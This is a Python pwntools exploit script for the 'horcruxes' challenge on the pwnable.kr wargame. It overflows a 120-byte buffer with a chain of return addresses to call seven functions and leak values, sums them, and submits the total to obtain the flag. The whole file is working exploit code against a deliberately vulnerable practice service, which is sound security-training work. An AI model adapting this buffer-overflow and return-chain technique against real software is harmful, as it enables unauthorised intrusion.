from pwn import *
import re

# p = process('./horcruxes')
p = remote('pwnable.kr', 9032)
# context.log_level = 'debug'

A = 0x0809fe4b
B = 0x0809fe6a
C = 0x0809fe89
D = 0x0809fea8
E = 0x0809fec7
F = 0x0809fee6
G = 0x0809ff05

p.recvuntil(b'Select Menu:')

# p = sys.stdout.buffer

# p.write(
p.sendline(
	b'1\n' +
	b'a' * 120 +
	p32(A) +
	p32(B) +
	p32(C) +
	p32(D) +
	p32(E) +
	p32(F) +
	p32(G) +
	p32(0x0809fffc)
	# + b'\n'
)

data = re.findall(r'[\+\-][0-9]+', p.recvuntil(b'Select Menu:').decode())

s = 0
for d in data:
	s += int(d)

s %= 2 ** 32

p.sendline(b'1')
p.sendline(str(s).encode())

p.recvuntil(b'How many EXP did you earned? : ')

print(p.recvall().decode())

# p.interactive()
